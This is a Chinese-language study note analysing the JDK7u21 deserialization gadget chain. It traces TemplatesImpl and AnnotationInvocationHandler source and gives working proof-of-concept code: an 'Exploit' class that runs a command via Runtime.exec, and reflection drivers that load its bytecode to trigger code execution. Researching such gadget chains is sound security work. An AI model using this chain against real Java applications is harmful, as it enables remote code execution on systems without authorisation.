# TemplatesImpl

在理解JDK7U21前，需要先关注TemplatesImpl，由于调用其getOutputProperties可以加载字节码形式的class而导致任意代码执行的特性，所以许多Gadget都是围绕着如何调用TemplatesImpl.getOutputProperties()方法展开的，jdk7u21也是如此。

我们来看下TemplatesImpl的getOutputProperties：
```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```
他会调用newTransformer，跟进：
```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```
跟进getTransletInstance：
```java
private Translet getTransletInstance()
    throws TransformerConfigurationException {
    try {
        if (_name == null) return null; // 这里判断_name的值，因此构造需要给他赋值

        if (_class == null) defineTransletClasses(); // 跟进

        // The translet needs to keep a reference to all its auxiliary
        // class to prevent the GC from collecting them
        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
        translet.postInitialization();
        translet.setTemplates(this);
        translet.setServicesMechnism(_useServicesMechanism);
        if (_auxClasses != null) {
            translet.setAuxiliaryClasses(_auxClasses);
        }

        return translet;
    }
    catch (InstantiationException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (IllegalAccessException e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```
跟进defineTransletClasses：
```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) { // 如果_bytecodes为null，则会抛出错误，因此需要赋值
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }
    // 实例化一个classloader，此时，loader类型为TransletClassLoader
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader());
            }
        });

    try {
        final int classCount = _bytecodes.length; // 获取_bytecodes的长度，_bytecodes是二维数组
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new Hashtable();
        }
        // 遍历_bytecodes
        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]); //调用TransletClassLoader.defineClass进行类加载，并赋值给_class
            final Class superClass = _class[i].getSuperclass();
            // 获取class的父类

            // 判断父类是不是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，如果是，则给_transletIndex赋值，默认为-1
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }
        // 如果_transletIndex为默认值，则抛出错误，这意味着，我们传进来的class至少要有一个class是AbstractTranslet的子类，才能让_transletIndex > 0
        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```
回到TemplatesImpl.getTransletInstance，
```java
if (_class == null) defineTransletClasses(); // 完成_class赋值

AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  // 对_class进行实例化
```
对任何类进行实例化，都必然会调用一个类的构造方法，因此我们只需要构造一个恶意类，在构造方法中写入命令执行之类的代码即可，正如上面代码注释所言，这个恶意类必须继承AbstractTranslet。

了解这些以后，我们就可以尝试构造代码来实现，首先构造恶意代码：
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exploit extends AbstractTranslet {
    public Exploit() throws Exception{
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception{
        Exploit exploit = new Exploit();
    }
}
```
然后javac编译:
```
javac Exploit.java
```

> 需要注意的是，此时的javac必须是与当前环境相同的jdk版本，由于当前环境的jdk版本为1.7，这在多jdk版本的PC环境下通常会出现问题，比如你的javac是jdk1.8或者jdk11的，而项目环境是jdk1.7，则后续调试环节会报错：`java.lang.UnsupportedClassVersionError: Unsupported major.minor version 52.0`（大致是loadClass环节），不过由于这个需求是一次性的，所以直接去jdk1.7的Home目录下找javac即可，MacOS的Path是：
```
/Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/javac
```

然后构造测试demo：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;

public class templatesImpl{
    public static void main(String[] args) throws Exception{
        TemplatesImpl tmpl = new TemplatesImpl();

        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] bytes = new byte[1][];
        bytes[0] = readClassFileToByteArray("Exploit.class");
        bytecodes.set(tmpl, bytes);

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "Exploit");  // 可以瞎填，不为空即可

        tmpl.getOutputProperties();
    }

    public static byte[] readClassFileToByteArray(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] fileData = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead = fis.read(fileData);
            if (bytesRead != fileData.length) {
                throw new IOException("Failed to read the complete file");
            }
        }
        return fileData;
    }
}
```

代码细节见于：`templatesImpl.java` 和 `Exploit.java`

最后总结一下TemplatesImpl的调用链：
```java
TemplatesImpl.getOutputProperties() -> newTransformer()
    -> getTransletInstance()
        -> defineTransletClasses()
            -> TransletClassLoader.defineClass()
        -> (AbstractTranslet) _class[_transletIndex].newInstance()
```

> 插一句：直接调用newTransformer，效果和调用getOutputProperties是一样的。

# AnnotationInvocationHandler

在CC1时，我们就已经接触到了AnnotationInvocationhandler，只不过当时关注点在Map.put/get这些方法的调用上，其实他的getMemberMethods方法也很有特点：
```java
private Method[] getMemberMethods() {
    // 主要作用就是获取this.type所有方法，然后返回
    if (this.memberMethods == null) {
        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction<Method[]>() {
            public Method[] run() {
                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                AccessibleObject.setAccessible(var1, true);
                return var1;
            }
        });
    }

    return this.memberMethods;
}
```


```java
private Boolean equalsImpl(Object var1) {
    if (var1 == this) {  
        return true;
    } else if (!this.type.isInstance(var1)) {  // 必须与this.type同类型
        return false;
    } else {
        Method[] var2 = this.getMemberMethods();  //调用getMemberMethods，获得所有方法
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) { // 遍历所有方法
            Method var5 = var2[var4];  
            String var6 = var5.getName();
            Object var7 = this.memberValues.get(var6);
            Object var8 = null;
            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
            if (var9 != null) {
                var8 = var9.memberValues.get(var6);
            } else {
                try {
                    var8 = var5.invoke(var1);  // 通过反射进行方法调用
                } catch (InvocationTargetException var11) {
                    return false;
                } catch (IllegalAccessException var12) {
                    throw new AssertionError(var12);
                }
            }

            if (!memberValueEquals(var7, var8)) {
                return false;
            }
        }

        return true;
    }
}
```
结合上面代码，我们可以得出结论：
1. this.type与var1必须同类型
2. 只要调用equalsImpl方法，this.type的所有方法都会被调用
3. 如果this.type是TemplatesImpl呢？不就可以调用getOutputProperties/newTransformer了？

我们可以轻松构造demo验证：
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class annotationInvocationHandler {
    public static void main(String[] args) throws Exception{
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());

        Method equalsImpl = aClass.getDeclaredMethod("equalsImpl", Object.class);
        equalsImpl.setAccessible(true);
        equalsImpl.invoke(ahObject, new templatesImpl().getTmpl());
    }
}
```
完整代码见于：`annotationInvocationHander.java`  

